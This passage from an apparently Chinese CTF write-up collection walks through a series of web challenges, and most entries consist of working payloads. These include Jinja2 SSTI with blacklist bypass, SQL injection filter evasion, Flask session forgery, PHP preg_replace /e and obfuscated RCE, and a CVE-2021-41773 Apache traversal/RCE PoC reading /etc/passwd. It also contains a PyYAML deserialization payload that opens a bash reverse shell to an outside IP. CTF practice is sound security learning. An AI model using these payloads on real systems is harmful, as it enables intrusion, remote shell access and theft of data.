<p><code>hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p><code>O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:168:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;&#125;s:5:&quot;email&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>payload:</p>
<p><code>?cata=1 POST name=test&amp;phone[]=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;email=test</code></p>
<h1 id="104-NCTF-2018-flask真香"><a href="#104-NCTF-2018-flask真香" class="headerlink" title="104.[NCTF 2018]flask真香"></a>104.[NCTF 2018]flask真香</h1><p>&#x2F;后面直接接的就是注入点，无需参数，fuzz存在以下黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class</span><br><span class="line">getattr</span><br><span class="line">builtins</span><br><span class="line">import</span><br><span class="line">os</span><br></pre></td></tr></table></figure>

<p>使用字符串拼接绕过，查询子类</p>
<p><code>&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcla''sses__']()&#125;&#125;</code>，得到大量子类</p>
<p>寻找warnings.catch_warnings子类的下标：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">classes=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[&lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;,  ...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">alllist=[]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i==<span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result+=i</span><br><span class="line"><span class="comment">#寻找要找的类，并返回其索引</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(alllist):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;warnings.catch_warnings&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment">#117---&gt; &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[117].__init__.__globals__['__buil''tins__']['ev''al']("__im""port__('o''s').po""pen('ls /').read()")&#125;&#125;</code></p>
<h1 id="105-LitCTF-2023-就当无事发生"><a href="#105-LitCTF-2023-就当无事发生" class="headerlink" title="105.[LitCTF 2023]就当无事发生"></a>105.[LitCTF 2023]就当无事发生</h1><p>进入出题人博客-&gt;关于我-&gt;github-&gt;进入ProbiusOfficial.github.io查找归档文件里的flag，但是现在已删除，只能在wp里找到</p>
<h1 id="106-SWPUCTF-2022-新生赛-ez-sql"><a href="#106-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="106.[SWPUCTF 2022 新生赛]ez_sql"></a>106.[SWPUCTF 2022 新生赛]ez_sql</h1><p>双写绕过，&#x2F;**&#x2F;绕过空格</p>
<p>POST：<code>nss=2&#39;/**/ununionion/**/select/**/1,database(),3;#</code></p>
<p>得到NSS_db，回显位在2和3，但后续注入要在3</p>
<p><code>nss=2&#39;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#39;NSS_db&#39;;#</code></p>
<p><code>nss=2&#39;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#39;NSS_tb&#39;;#</code></p>
<p><code>2&#39;/**/ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_tb;#</code></p>
<h1 id="107-HDCTF-2023-YamiYami"><a href="#107-HDCTF-2023-YamiYami" class="headerlink" title="107.[HDCTF 2023]YamiYami"></a>107.[HDCTF 2023]YamiYami</h1><p>非预期：file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ</p>
<p>预期：session伪造+yaml反序列化，当前目录在&#x2F;app，尝试读取&#x2F;app&#x2F;app.py，可以使用二次url编码绕过waf</p>
<p><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
<p>读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> re, random, uuid </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> yaml </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen </span><br><span class="line">app = Flask(__name__) random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">False</span> BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>] app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; Welcome to HDCTF2023 Read somethings</span></span><br><span class="line"><span class="string">Here is the challenge Upload file Enjoy it pwd </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(): </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>) </span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        <span class="keyword">if</span> m: </span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> n: </span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">    	res = urlopen(url) </span><br><span class="line">    	<span class="keyword">return</span> res.read() </span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">    	<span class="built_in">print</span>(<span class="built_in">str</span>(ex)) </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>): </span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST: </span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>) </span><br><span class="line">            <span class="keyword">return</span> redirect(request.url) </span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>] </span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename): </span><br><span class="line">            filename = secure_filename(file.filename) </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>): </span><br><span class="line">                	os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>) </span><br><span class="line">                file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)) </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(): </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>: </span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile): </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f: </span><br><span class="line">            yaml.full_load(f) </span><br><span class="line">            f.close() </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span> </span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read() </span><br><span class="line">    app.run( debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span> ) </span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>在&#x2F;boogipop路由下是getflag的主要逻辑，session伪造+yaml反序列化，先需要知道secret_key，在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，再用脚本解密，修改，再加密</p>
<p><code>02:42:ac:02:9e:d3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac029ed3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s 137.52056192943886 -c <span class="string">&#x27;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZO_r9w.mAjNdzv1Oe15iXPs7n6g0rSK02A&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;passport&#x27;</span>: <span class="string">&#x27;YamiYami&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#按照题目要求修改passport为Welcome To HDCTF2023</span></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s 137.52056192943886 -t <span class="string">&quot;&#123;&#x27;passport&#x27;:&#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span></span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZO_xQw.MOIAYyIci-lbAAe3YSHa_4WH-8s</span><br></pre></td></tr></table></figure>

<p>伪造session完成，接下来处理yaml反序列化，利用的是<code>yaml.full_load(f)</code>，exp：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.txt</span></span><br><span class="line"><span class="type">!!python/object/new:str</span></span><br><span class="line">    <span class="attr">args:</span> []</span><br><span class="line">    <span class="attr">state:</span> <span class="type">!!python/tuple</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.68.224/8888 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span></span><br><span class="line">        <span class="attr">args:</span> []</span><br><span class="line">        <span class="attr">state:</span></span><br><span class="line">          <span class="attr">update:</span> <span class="type">!!python/name:eval</span></span><br><span class="line">          <span class="attr">items:</span> <span class="type">!!python/name:list</span></span><br></pre></td></tr></table></figure>

<p>在<code>upload</code>处上传，修改session为伪造的值，开启端口监听。进行文件包含：<code>/boogipop?file=uploads/2.txt</code></p>
<p>反弹shell，<code>cat /tmp/flag_13_114514</code></p>
<h1 id="108-NCTF-2018-滴-晨跑打卡"><a href="#108-NCTF-2018-滴-晨跑打卡" class="headerlink" title="108.[NCTF 2018]滴!晨跑打卡"></a>108.[NCTF 2018]滴!晨跑打卡</h1><p>&#x2F;**&#x2F;被过滤使用%a0代替，#被过滤正常闭合处理</p>
<p>绕空格的一些常见方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/</span><br></pre></td></tr></table></figure>

<p>使用bp发包，请勿在浏览器操作</p>
<p><code>?id=1%27%a0union%a0select%a01,table_name,3,4%a0from%a0information_schema.tables%a0where%a0table_schema=%27database()%27%a0||%27</code></p>
<p>和原题不一样的是在这个地方会回显查询语句本身，通过回显可以看到表名是pcnumber</p>
<p><code>/?id=1%27%a0union%a0select%a01,column_name,3,4%a0from%a0information_schema.columns%a0where%a0table_name=%27pcnumber%27%a0||%27</code></p>
<p>最终payload：</p>
<p><code>?id=1%27%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0pcnumber),3,4%27</code></p>
<h1 id="109-SWPUCTF-2022-新生赛-webdog1-start"><a href="#109-SWPUCTF-2022-新生赛-webdog1-start" class="headerlink" title="109.[SWPUCTF 2022 新生赛]webdog1__start"></a>109.[SWPUCTF 2022 新生赛]webdog1__start</h1><p>F12看到提示，简单的md5比较，传web&#x3D;<code>0e215962017</code></p>
<p>进入下一层，F12看到robots提示-&gt;f14g.php</p>
<p>响应包头<code>Hint:oh good job! but no flag ,come to F1l1l1l1l1lag.php</code></p>
<p>限制payload长度为18字符，较短的cat是\t，较短的{IFS}是\t，然后通配符*去模糊匹配flag</p>
<p><code>?get=system(&quot;nl\t/f*&quot;);</code></p>
<h1 id="110-GXYCTF-2019-BabySqli"><a href="#110-GXYCTF-2019-BabySqli" class="headerlink" title="110.[GXYCTF 2019]BabySqli"></a>110.[GXYCTF 2019]BabySqli</h1><p>F12有段b32-&gt;b64，得到</p>
<p><code>select * from user where username = &#39;$name&#39;</code></p>
<p>提交数据的post参数为<code>name&amp;pw</code></p>
<p>大小写绕过waf：<code>name=admin&#39;oRder by 4#&amp;pw=1</code></p>
<p>name&#x3D;admin时报错wrong pass</p>
<p>提交pw为数组时报错md5</p>
<p>payload：<code>name=admi&#39;union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></p>
<h1 id="111-NSSRound-4-SWPU-ez-rce"><a href="#111-NSSRound-4-SWPU-ez-rce" class="headerlink" title="111.[NSSRound#4 SWPU]ez_rce"></a>111.[NSSRound#4 SWPU]ez_rce</h1><p>CVE-2021-41773，Apache HTTP Server 2.4.49目录穿越漏洞，<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>默认开启，允许目录穿越，此外如果服务端开启了gi或者cgid这两个mod的情况下，利用该漏洞还将可以执行任意cg命令</p>
<p>poc：<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd</code></p>
<p>RCE：<code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh          A=|echo;cmd</code></p>
<h1 id="112-BJDCTF-2020-ZJCTF，不过如此"><a href="#112-BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="112.[BJDCTF 2020]ZJCTF，不过如此"></a>112.[BJDCTF 2020]ZJCTF，不过如此</h1><p>payload1：<code>/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑就是执行<code>eval(&#39;strlower(&quot;\\1&quot;);&#39;)</code>，正则是e模式。存在漏洞：e模式下preg_replace可以让第二个参数当做代码执行；正则表达式模式两边添加<code>&#123;&#125;</code>会将相关匹配存储到一个临时缓冲区，从1开始排序，而<code>\\1</code>就正好会匹配到第一个变量，传入<code>\S*=$&#123;phpinfo()&#125;</code>正则就是<code>preg_replace(&#39;/(&#39;.\S*.&#39;)/ei&#39;,&#39;strlower(&quot;\\1&quot;)&#39;,phpinfo());</code>临时缓存区：<code>/S*==&gt;phpinfo();strlower(&quot;\\1&quot;)</code>匹配第一个，就执行了phpinfo()。</p>
<p>payload2：<code>?\S*=$&#123;phpinfo()&#125;</code></p>
<h1 id="113-鹏城杯-2022-简单的php"><a href="#113-鹏城杯-2022-简单的php" class="headerlink" title="113.[鹏城杯 2022]简单的php"></a>113.[鹏城杯 2022]简单的php</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;&#x27; === preg_replace(&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;, &#x27;&#x27;, $code)</span><br></pre></td></tr></table></figure>

<p><code>[^\s\(\)]+?</code> 表示<strong>不匹配</strong>所有空白符和<code>()</code> 一次或多次</p>
<p><code>\((?R)?\)</code> 表示循环匹配<code>()</code> 一次或0次，从这一点就需要使用二维数组绕过</p>
<p>无参函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主要</span></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>()</span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()</span><br><span class="line"><span class="title function_ invoke__">session_id</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#配套</span></span><br><span class="line"><span class="title function_ invoke__">implode</span>() <span class="comment">//将一维数组转化为字符串</span></span><br><span class="line"><span class="title function_ invoke__">getchwd</span>() <span class="comment">//返回当前目录</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>() <span class="comment">//返回指定目录中文件和目录的数组</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>() <span class="comment">//返回路径中目录的部分</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>()   <span class="comment">//改变当前目录</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>()<span class="comment">//输出一个文件</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//返回数组当前单元，默认取第一个值</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>()     <span class="comment">//current()的别名</span></span><br><span class="line"><span class="title function_ invoke__">next</span>()    <span class="comment">//将函数内部指针指向数组中的下一个元素并输出</span></span><br><span class="line"><span class="title function_ invoke__">end</span>()     <span class="comment">//将内部指针指向数组中最后一个元素并输出</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>()<span class="comment">//函数返回数组中的随机键名，如果返回不止一个键名，则返回包含随机键名的数组</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>()<span class="comment">//用于反转/交换数组中所有键名和关联的键值</span></span><br><span class="line"><span class="title function_ invoke__">array_slice</span>()<span class="comment">//在数组中根据条件读取出一段值并返回</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()<span class="comment">//返回反转顺序的数组</span></span><br><span class="line"><span class="title function_ invoke__">chr</span>()      <span class="comment">//ascii转字符</span></span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>()  <span class="comment">//16进制转二进制串</span></span><br><span class="line"><span class="title function_ invoke__">getenv</span>()   <span class="comment">//获取环境变量，7.1后可以</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>()<span class="comment">//返回一个包含本地数字及货币格式信息的数组</span></span><br></pre></td></tr></table></figure>

<p>二维数组拼接注意的点：必须用<code>[!%FF]</code>进行分割</p>
<p>payload：<code>system(end(getallheaders()));-&gt;(~%8C%86%8C%8B%9A%92)[!%FF]((~%9A%91%9B)[!%FF]((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)[!%FF]()));</code></p>
<p>数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28147</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: BD_UPN=12314753</span><br><span class="line">Connection: cat /nssctfflag</span><br></pre></td></tr></table></figure>

<h1 id="114-HGAME-2023-week1-Classic-Childhood-Game"><a href="#114-HGAME-2023-week1-Classic-Childhood-Game" class="headerlink" title="114.[HGAME 2023 week1]Classic Childhood Game"></a>114.[HGAME 2023 week1]Classic Childhood Game</h1><p>F12</p>
